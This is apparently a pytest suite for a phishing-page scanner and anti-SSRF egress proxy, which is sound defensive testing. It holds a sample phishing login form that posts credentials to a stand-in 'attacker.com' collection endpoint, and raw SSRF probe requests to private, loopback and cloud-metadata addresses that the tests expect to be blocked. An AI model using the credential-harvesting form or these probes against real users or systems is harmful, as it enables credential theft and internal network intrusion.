"""Unit and Integration tests for PlaywrightScanner, ValidatingEgressProxy, and DOM evidence parsing."""

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch
import pytest

from app.scanner.models import ScanOptions, ScanResult, ScanStatus
from app.scanner.playwright_scanner import (
    PlaywrightScanner,
    _is_tls_certificate_error,
    parse_dom_evidence,
)
from app.scanner.proxy import ValidatingEgressProxy


SAMPLE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Banking Login</title>
    <meta name="description" content="Official Portal">
    <meta property="og:title" content="Login Portal">
    <script src="https://cdn.example.org/tracker.js" async></script>
    <script>
        console.log("inline script");
    </script>
</head>
<body>
    <div class="login-container">
        <h1>Please Sign In</h1>
        <form id="authForm" action="https://attacker.com/collect.php" method="POST">
            <input type="text" name="username" id="user" placeholder="Username or Email" required>
            <input type="password" name="password" id="pass" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <form id="searchForm" action="/search" method="GET">
            <input type="text" name="q" placeholder="Search...">
        </form>
    </div>
</body>
</html>
"""


class TestDOMEvidenceParsing:
    """Test suite verifying DOM, form, input, and script extraction."""

    def test_dom_parsing_structure(self):
        title, forms, scripts, meta = parse_dom_evidence(
            html_content=SAMPLE_HTML,
            base_url="https://secure.bank.example.com/login"
        )

        # Title
        assert title == "Secure Banking Login"

        # Meta tags
        assert meta.get("description") == "Official Portal"
        assert meta.get("og:title") == "Login Portal"

        # Forms
        assert len(forms) == 2

        # Form 1: External submission phishing pattern
        f1 = forms[0]
        assert f1.form_id == "authForm"
        assert f1.action_url == "https://attacker.com/collect.php"
        assert f1.action_domain == "attacker.com"
        assert f1.method == "POST"
        assert f1.is_external_submission is True
        assert f1.has_password_field is True

        field_names = [f.name for f in f1.fields]
        assert "username" in field_names
        assert "password" in field_names

        pwd_field = next(f for f in f1.fields if f.name == "password")
        assert pwd_field.is_password is True
        assert pwd_field.is_required is True

        # Form 2: Internal relative search form
        f2 = forms[1]
        assert f2.form_id == "searchForm"
        assert f2.action_url == "https://secure.bank.example.com/search"
        assert f2.is_external_submission is False
        assert f2.has_password_field is False

        # Scripts
        assert len(scripts) == 2
        ext_script = next(s for s in scripts if s.is_external)
        assert ext_script.domain == "example.org"
        assert ext_script.async_attr is True

        inline_script = next(s for s in scripts if s.is_inline)
        assert inline_script.src == ""


class TestValidatingEgressProxy:
    """Test suite verifying connection-level IP pinning and Anti-SSRF proxy enforcement."""

    @pytest.mark.asyncio
    async def test_proxy_blocks_connect_to_private_ip(self):
        async with ValidatingEgressProxy() as proxy:
            reader, writer = await asyncio.open_connection(proxy.host, proxy.port)
            # Send HTTPS CONNECT targeting private LAN
            writer.write(b"CONNECT 192.168.1.1:443 HTTP/1.1\r\nHost: 192.168.1.1:443\r\n\r\n")
            await writer.drain()

            response = await reader.read(1024)
            writer.close()
            await writer.wait_closed()

            assert b"403 Forbidden" in response
            assert b"Anti-SSRF" in response
            assert len(proxy.blocked_requests) == 1
            assert proxy.blocked_requests[0]["code"] == "BLOCKED_IP_LITERAL"

    @pytest.mark.asyncio
    async def test_proxy_blocks_connect_to_metadata_ip(self):
        async with ValidatingEgressProxy() as proxy:
            reader, writer = await asyncio.open_connection(proxy.host, proxy.port)
            writer.write(b"CONNECT 169.254.169.254:80 HTTP/1.1\r\nHost: 169.254.169.254:80\r\n\r\n")
            await writer.drain()

            response = await reader.read(1024)
            writer.close()
            await writer.wait_closed()

            assert b"403 Forbidden" in response
            assert len(proxy.blocked_requests) == 1

    @pytest.mark.asyncio
    async def test_proxy_blocks_http_get_to_loopback(self):
        async with ValidatingEgressProxy() as proxy:
            reader, writer = await asyncio.open_connection(proxy.host, proxy.port)
            writer.write(b"GET http://127.0.0.1:8080/admin HTTP/1.1\r\nHost: 127.0.0.1:8080\r\n\r\n")
            await writer.drain()

            response = await reader.read(1024)
            writer.close()
            await writer.wait_closed()

            assert b"403 Forbidden" in response
            assert len(proxy.blocked_requests) == 1


class TestPlaywrightScannerSecurityHardening:
    """Test suite verifying scanner execution, security hardening, and resource cleanup."""

    def test_scanner_blocks_ssrf_before_browser_launch(self, tmp_path):
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        result = scanner.scan_sync("http://192.168.1.1/admin")

        assert result.status == ScanStatus.BLOCKED_SSRF
        assert len(result.errors) > 0
        assert "Private/LAN IP address rejected" in result.errors[0]
        assert result.viewport_screenshot_path is None
        assert result.dom_snapshot_path is None

    def test_scanner_structured_pydantic_schema(self, tmp_path):
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        result = scanner.scan_sync("http://localhost:8000")

        data = result.model_dump()
        assert "scan_id" in data
        assert "requested_url" in data
        assert "status" in data
        assert data["status"] == "BLOCKED_SSRF"
        assert "pinned_ip" in data

    def test_tls_error_classification_helper(self):
        assert _is_tls_certificate_error("net::ERR_CERT_AUTHORITY_INVALID") is True
        assert _is_tls_certificate_error("net::ERR_CERT_COMMON_NAME_INVALID") is True
        assert _is_tls_certificate_error("net::ERR_CERT_DATE_INVALID") is True
        assert _is_tls_certificate_error("Navigation failed with SSL_ERROR_BAD_CERT_DOMAIN") is True
        assert _is_tls_certificate_error("net::ERR_NAME_NOT_RESOLVED") is False
        assert _is_tls_certificate_error("net::ERR_CONNECTION_TIMED_OUT") is False

    @pytest.mark.asyncio
    async def test_tls_certificate_error_captured(self, tmp_path):
        """Verify that invalid TLS certificates fail safely and record CERT_ERROR."""
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        
        # Mock Playwright throwing net::ERR_CERT_AUTHORITY_INVALID
        from playwright.async_api import Error as PlaywrightError

        with patch("app.scanner.playwright_scanner.validate_url_and_resolve") as mock_val, \
             patch("app.scanner.playwright_scanner.async_playwright") as mock_pw:
            
            mock_val.return_value = MagicMock(
                is_valid=True,
                canonical_url="https://self-signed.badssl.com/",
                hostname="self-signed.badssl.com",
                port=443,
                resolved_ips=["104.154.89.105"],
                pinned_ip="104.154.89.105"
            )

            mock_page = AsyncMock()
            mock_page.goto.side_effect = PlaywrightError("net::ERR_CERT_AUTHORITY_INVALID at https://self-signed.badssl.com/")
            mock_page.content.return_value = "<html><body>Cert Error</body></html>"
            mock_page.url = "https://self-signed.badssl.com/"

            mock_context = AsyncMock()
            mock_context.new_page.return_value = mock_page

            mock_browser = AsyncMock()
            mock_browser.new_context.return_value = mock_context

            mock_playwright_inst = AsyncMock()
            mock_playwright_inst.chromium.launch.return_value = mock_browser

            mock_pw.return_value.__aenter__.return_value = mock_playwright_inst

            opts = ScanOptions(ignore_https_errors=False, enable_egress_proxy=False)
            result = await scanner.scan("https://self-signed.badssl.com/", options=opts)

            assert result.status == ScanStatus.CERT_ERROR
            assert result.tls_error is not None
            assert "ERR_CERT_AUTHORITY_INVALID" in result.tls_error
            assert any("TLS certificate validation failed" in err for err in result.errors)
            assert any("Security warning" in warn for warn in result.warnings)

    @pytest.mark.asyncio
    async def test_resource_cleanup_on_exception(self, tmp_path):
        """Verify that browser context and proxy server are closed even when unexpected exceptions occur."""
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        
        with patch("app.scanner.playwright_scanner.validate_url_and_resolve") as mock_val, \
             patch("app.scanner.playwright_scanner.async_playwright") as mock_pw:
            
            mock_val.return_value = MagicMock(
                is_valid=True,
                canonical_url="https://crash-test.com/",
                hostname="crash-test.com",
                port=443,
                resolved_ips=["93.184.216.34"],
                pinned_ip="93.184.216.34"
            )

            mock_page = AsyncMock()
            mock_page.goto.side_effect = RuntimeError("Simulated unexpected crash during page navigation")
            mock_page.content.return_value = "<html><body>Crash Test</body></html>"
            mock_page.url = "https://crash-test.com/"

            mock_context = AsyncMock()
            mock_context.new_page.return_value = mock_page

            mock_browser = AsyncMock()
            mock_browser.new_context.return_value = mock_context

            mock_playwright_inst = AsyncMock()
            mock_playwright_inst.chromium.launch.return_value = mock_browser

            mock_pw.return_value.__aenter__.return_value = mock_playwright_inst

            opts = ScanOptions(enable_egress_proxy=False)
            result = await scanner.scan("https://crash-test.com/", options=opts)

            assert result.status == ScanStatus.FAILED
            assert any("Simulated unexpected crash" in err for err in result.errors)
            # Verify context and browser cleanup were called
            assert mock_context.close.called
            assert mock_browser.close.called

    @pytest.mark.asyncio
    async def test_selector_loop_proactor_fallback(self, tmp_path):
        """Verify scanner dispatches cleanly when running under a non-Proactor loop on Windows."""
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        with patch("app.scanner.playwright_scanner.validate_url_and_resolve") as mock_val:
            mock_val.return_value = MagicMock(
                is_valid=False,
                error_message="Private IP blocked",
                error_code="SSRF_PRIVATE_IP",
                resolved_ips=["127.0.0.1"],
            )
            # Test that scanner.scan returns BLOCKED_SSRF without crashing
            result = await scanner.scan("http://127.0.0.1")
            assert result.status == ScanStatus.BLOCKED_SSRF


class TestIntegrationLiveScan:
    """Integration test suite executing real browser automation against public targets."""

    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_live_controlled_scan_with_proxy(self, tmp_path):
        """Controlled live test with validating forward proxy against safe public domain."""
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        opts = ScanOptions(
            timeout_seconds=15,
            capture_full_page=False,
            viewport_width=1280,
            viewport_height=720,
            enable_egress_proxy=True,
            ignore_https_errors=False,
        )

        result = await scanner.scan("https://example.com", options=opts)

        assert result.status == ScanStatus.COMPLETED
        assert result.status_code == 200
        assert "example.com" in result.final_url
        assert result.page_title is not None
        assert "Example Domain" in result.page_title
        assert result.viewport_screenshot_path is not None
        assert Path(result.viewport_screenshot_path).exists()
        assert result.dom_snapshot_path is not None
        assert Path(result.dom_snapshot_path).exists()
        assert result.pinned_ip is not None
        assert result.scan_duration_ms > 0
